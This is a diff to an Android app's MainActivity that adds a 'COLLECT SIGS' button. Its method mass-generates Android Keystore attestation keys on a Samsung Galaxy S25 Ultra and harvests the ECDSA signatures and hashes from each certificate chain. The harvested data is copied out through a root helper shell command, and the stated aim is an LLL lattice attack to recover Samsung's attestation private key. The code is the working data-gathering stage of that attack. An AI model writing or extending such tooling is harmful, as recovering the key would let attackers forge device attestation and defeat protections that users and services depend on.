@@ -130,6 +130,24 @@ public class MainActivity extends Activity {
 
         root.addView(row2);
 
+        // Third row: Signature collector
+        LinearLayout row3 = new LinearLayout(this);
+        row3.setOrientation(LinearLayout.HORIZONTAL);
+        row3.setGravity(Gravity.CENTER);
+        row3.setPadding(0, 8, 0, 0);
+
+        Button sigButton = new Button(this);
+        sigButton.setText("COLLECT SIGS");
+        sigButton.setTextColor(Color.BLACK);
+        sigButton.setBackgroundColor(Color.parseColor("#00AAFF"));
+        sigButton.setTextSize(12);
+        sigButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
+        sigButton.setPadding(24, 16, 24, 16);
+        sigButton.setOnClickListener(v -> collectSignatures());
+        row3.addView(sigButton);
+
+        root.addView(row3);
+
         scrollView = new ScrollView(this);
         scrollView.setPadding(0, 16, 0, 0);
         logView = new TextView(this);
@@ -541,6 +559,117 @@ public class MainActivity extends Activity {
                 log("[!] Kill error: " + e.getMessage());
             }
         });
+    }
+
+    // ================================================================
+    // ECDSA SIGNATURE COLLECTION — For LLL Lattice Reduction Attack
+    // Each attestation generates a NEW Samsung-signed certificate!
+    // Collect 100+ for nonce bias analysis → private key recovery
+    // ================================================================
+    private void collectSignatures() {
+        log("");
+        log("========================================");
+        log("  ECDSA SIGNATURE COLLECTION");
+        log("  Samsung Attestation Key Analysis");
+        log("========================================");
+        log("");
+
+        executor.execute(() -> {
+            try {
+                KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
+                ks.load(null);
+
+                int totalSigs = 0;
+                StringBuilder sigData = new StringBuilder();
+                sigData.append("# Samsung ECDSA Attestation Signatures\n");
+                sigData.append("# SM-S938W Galaxy S25 Ultra\n");
+                sigData.append("# Format: idx|level|issuer|algo|sig_hex|hash_hex\n\n");
+
+                for (int i = 0; i < 100; i++) {
+                    String alias = "jk_sig_" + i + "_" + System.currentTimeMillis();
+                    try {
+                        byte[] challenge = new byte[32];
+                        for (int j = 0; j < 32; j++)
+                            challenge[j] = (byte)((i * 7 + j * 13) & 0xFF);
+
+                        KeyPairGenerator kpg = KeyPairGenerator.getInstance(
+                            KeyProperties.KEY_ALGORITHM_EC, "AndroidKeyStore");
+
+                        KeyGenParameterSpec.Builder spec = new KeyGenParameterSpec.Builder(
+                            alias, KeyProperties.PURPOSE_SIGN | KeyProperties.PURPOSE_VERIFY)
+                            .setDigests(KeyProperties.DIGEST_SHA256)
+                            .setAlgorithmParameterSpec(
+                                new java.security.spec.ECGenParameterSpec("secp256r1"))
+                            .setAttestationChallenge(challenge);
+
+                        try { spec.setIsStrongBoxBacked(true); }
+                        catch (Exception e) { /* TEE fallback */ }
+
+                        kpg.initialize(spec.build());
+                        java.security.KeyPair kp = kpg.generateKeyPair();
+
+                        java.security.cert.Certificate[] chain = ks.getCertificateChain(alias);
+                        if (chain != null) {
+                            for (int c = 0; c < chain.length; c++) {
+                                java.security.cert.X509Certificate cert =
+                                    (java.security.cert.X509Certificate) chain[c];
+                                byte[] sig = cert.getSignature();
+                                byte[] tbs = cert.getTBSCertificate();
+
+                                java.security.MessageDigest md =
+                                    java.security.MessageDigest.getInstance("SHA-256");
+                                byte[] tbsHash = md.digest(tbs);
+
+                                String sigHex = bytesToHex(sig);
+                                String hashHex = bytesToHex(tbsHash);
+                                String issuer = cert.getIssuerDN().getName();
+                                String algo = cert.getSigAlgName();
+
+                                sigData.append(i + "|" + c + "|" + issuer + "|"
+                                    + algo + "|" + sigHex + "|" + hashHex + "\n");
+                                totalSigs++;
+                            }
+                        }
+                        ks.deleteEntry(alias);
+
+                        if (i % 10 == 9) {
+                            log("[+] " + (i+1) + "/100 keys generated, " + totalSigs + " sigs");
+                        }
+                    } catch (Exception e) {
+                        if (i < 3) log("[!] Key " + i + ": " + e.getMessage());
+                        try { ks.deleteEntry(alias); } catch (Exception e2) {}
+                    }
+                }
+
+                // Save to file
+                String dir = getFilesDir().getAbsolutePath();
+                String outPath = dir + "/attestation_sigs.txt";
+                FileWriter fw = new FileWriter(outPath);
+                fw.write(sigData.toString());
+                fw.close();
+
+                // Also save to accessible location via root
+                String rootHelper = dir + "/" + ROOT_HELPER;
+                exec(rootHelper + " -c 'cp " + outPath
+                    + " /data/local/tmp/attestation_sigs.txt'");
+
+                log("");
+                log("[+] COLLECTED: " + totalSigs + " ECDSA signatures!");
+                log("[+] Saved to: " + outPath);
+                log("[+] Pull with: adb pull /data/local/tmp/attestation_sigs.txt");
+                log("");
+                log("[*] Run LLL analysis on iMac to check for nonce bias");
+
+            } catch (Exception e) {
+                log("[!] Collection error: " + e.getMessage());
+            }
+        });
+    }
+
+    private static String bytesToHex(byte[] bytes) {
+        StringBuilder sb = new StringBuilder();
+        for (byte b : bytes) sb.append(String.format("%02x", b & 0xFF));
+        return sb.toString();
     }
 
     private void resetButton() {
